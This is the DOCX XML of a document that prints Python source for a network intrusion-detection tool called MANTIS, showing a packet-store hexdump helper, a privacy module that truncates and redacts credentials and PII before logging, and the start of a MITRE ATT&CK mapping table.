    <w:p w14:paraId="604249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self._seq = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0FAF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self.total_seen = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76BE78A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self.proto_counts = {"TCP": 0, "UDP": 0, "ICMP": 0, "OTHER": 0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0428701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self.talkers = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6039AF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C91AB90" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B6FADF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hexdump(raw, width=16):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7671EA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"""Wireshark-style offset / hex / ASCII dump of raw bytes."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3537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lines = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139E18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off in range(0, len(raw), width):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330E085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chunk = raw[off:off + width]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C63968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hex_part = " ".join("%02x" % b for b in chunk)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5391879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hex_part = hex_part.ljust(width * 3 - 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110C67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ascii_part = "".join(chr(b) if 32 &lt;= b &lt; 127 else "." for b in chunk)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23DB4A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lines.append("%04x  %s  %s" % (off, hex_part, ascii_part))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBF26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"\n".join(lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763E49FF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EA9A8F5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DC399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now_hms():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E267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seconds + milliseconds, matches the packet timeline in the UI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9A55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 = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED279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time.strftime("%H:%M:%S", time.localtime(t)) + (".%03d" % int((t % 1) * 1000))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B89B9FE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DB12C39" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20FA76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module-level singleton shared by the sensor (writer) and SIEM (reader)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A3C6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STORE = PacketStore()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D0352A6"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src/utils/privacy.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038699F4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>125 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DCCCB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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14ACBCD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"""Privacy and data-minimisation controls for MANTIS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D5B71C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EDE84B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The persistence path applies two data-minimisation rules:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799533C5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BEFF29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payload excerpts persisted to disk are truncated to 64 bytes;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3B80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identifiers may be anonymised before they reach any log.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BE6886" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BBCC0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This module enforces both. It is deliberately separate from the detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="332E4CE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engines: the engines see the full payload in volatile memory so that</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1249A5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detection accuracy is unaffected, but anything that is *persisted* (CSV audit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E6D0E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log, UDP telemetry, HTML report, pcap export) passes through here first.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E3E0FD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="493B19C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Data minimisation applied here:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B58FF9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 length reduction   - truncate to configured excerpt size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20535B2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2. content redaction  - regex-replace credential/PII bearing tokens</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38DD436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3. pseudonymisation   - optional last-octet masking of IPv4 addresses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B6EDA60" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06BC4B3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Standard library only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009DB17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3CAD8562" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67E2DD1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re</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054799AA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26DEC2F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Ordered most-specific first so a card number is not partly eaten by the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEB082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generic digit-run rule.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A57CE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_PII_RULES = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B508C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RFC 5322-ish email address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441F6F5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(re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050073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"[EMAIL_REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6041A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13-16 digit payment card numbers, optional spaces/dashes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C3618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(re.compile(r"\b(?:\d[ \-]?){13,16}\b"), "[CARD_REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1282864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password / passwd / pwd = value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3466888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(re.compile(r"(?i)\b(pass(?:word|wd)?|pwd)\s*=\s*[^&amp;\s\"']+"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C91172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r"\1=[REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="453251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api keys, tokens, secrets, session ids</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366D21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(re.compile(r"(?i)\b(api[_\-]?key|token|secret|session[_\-]?id|auth)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139F4D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r"\s*[=:]\s*[^&amp;\s\"']+"), r"\1=[REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616D65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HTTP Authorization / Cookie headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CEDAA9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(re.compile(r"(?i)(authorization|cookie|set-cookie)\s*:\s*[^\r\n]+"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B658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r"\1: [REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6267FA9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UK National Insurance number</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A06404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(re.compile(r"(?i)\b[A-Z]{2}\d{6}[A-D]\b"), "[NINO_REDACTED]"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDD15E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789DE92D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D074E45" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C528EB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redact(text):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063936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"""Replace PII / credential bearing substrings with fixed markers."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BECC5C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if not text:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256D72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text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E01C4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pattern, replacement in _PII_RULES:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA9087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text = pattern.sub(replacement, text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B673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text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F819C41" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A54379E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BE65F3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payload_excerpt(payload, limit=64, privacy_mode=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE0CC3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a short, log-safe printable excerpt of a raw payload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E07ACD5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="777E20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payload may be bytes or str. Non-printable bytes become '.' so the excerpt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA24C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cannot smuggle ANSI escapes or control characters into a terminal or the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395146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CSV audit log (log-injection defence).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFDC8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BF13C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payload is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A3F14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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6C025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isinstance(payload, str):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A1A8E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raw = payload.encode("utf-8", errors="ignore")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D8964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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0A1A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raw = bytes(payload)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009932E5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1042299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1. data minimisation: never keep more than the configured excerpt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5541B09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clipped = raw[:max(0, int(limit))]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54205B12" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7852AB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2. make it printable and safe to write into a CSV cell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1683EE5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text = "".join(chr(b) if 32 &lt;= b &lt; 127 else "." for b in clipped)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5C43D2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14A2A7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3. content redaction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F02CB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privacy_mode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6941051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text = redact(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6CBCF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text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9AFEE4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="513147AB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A9758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anonymise_ip(ip, enabled=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B3CE0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"""Mask the host portion of an IPv4 address (192.168.1.57 -&gt; 192.168.1.0).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797DC0D3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="685B6A8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Keeps the /24 network, which is all that is needed to correlate an attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="161335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source in an isolated lab, while removing the individual host identifier.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79EA1C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Mirrors the widely used IP-anonymisation approach in web analytics.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255977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4466A5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enabled or not ip:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6A166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ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CEA00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parts = str(ip).split(".")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5822FA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len(parts) == 4:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F9C0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".".join(parts[:3] + ["0"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186A70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ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4669DD40" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6659AD6D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="195F0BE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truncate_hex(hex_string, limit_bytes=64):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E57BC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"""Clip a hex-encoded frame snapshot to limit_bytes worth of hex chars."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E3E3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hex_string:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA64F3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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A38D4F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hex_string[:max(0, int(limit_bytes)) * 2]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414F7448" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="202CB27E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DC8586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apply(config, src_ip=None, payload=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F5207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"""Convenience helper: apply the whole policy from a Config object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BEB718A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="626F7B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Returns (safe_ip, safe_excerpt).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69EA31B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881F43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safe_ip = anonymise_ip(src_ip, getattr(config, "anonymise_ips", False))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8318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safe_excerpt = payload_excerpt(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4199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payload,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BAFA80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limit=getattr(config, "payload_excerpt_bytes", 64),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CCEF0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privacy_mode=getattr(config, "privacy_mode", True),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69ED99B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B300B2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safe_ip, safe_excerpt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D28BE0B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F0F94E4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13CFFA6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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC6C3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samples = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6059E1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b"GET /?user=bob@example.com&amp;password=hunter2 HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73292F7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b"POST /pay card=4111 1111 1111 1111 api_key=sk_live_9932",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0EDC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b"Cookie: session_id=abcd1234; theme=dark",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2EB08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9383A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s in samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D25ADA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print(payload_excerpt(s, limit=64))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2984B67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print(anonymise_ip("192.168.1.57"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6358CD5E"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src/utils/mitre.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CB7CB1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>204 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797B819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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12268DC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"""MITRE ATT&amp;CK enrichment and risk scoring for MANTIS alerts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1955DE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="230012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Threat framing tells the analyst which adversary technique an observation may</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54CAAF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correspond to, allowing the alert to be triaged against a known attack model.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC60150" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D2D57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This module maps each MANTIS detection to its MITRE ATT&amp;CK Enterprise</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8AF8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technique and tactic, and derives a bounded 0-10 risk score from the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31796F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technique's base severity plus the engine's own confidence signal. The mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC4E1E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is a static lookup table, so enrichment costs one dictionary hit per alert and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1C11E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keeps enrichment overhead small.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E66A81" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5390D68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Reference: MITRE ATT&amp;CK Enterprise Matrix v14 (attack.mitre.org).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768359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Standard library only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281710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17F385AA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="745B96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re</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B28B2D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7492384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detection kind -&gt; ATT&amp;CK technique metadata</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2886E50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TECHNIQUES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0CE5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"ddos": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC0F2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"id": "T1498",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7434201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"name": "Network Denial of Service",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBF58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"tactic": "Impact",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB92A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"tactic_id": "TA0040",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A5372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"severity": "CRITICAL",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1441DD1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"base_score": 8.5,</w:t>
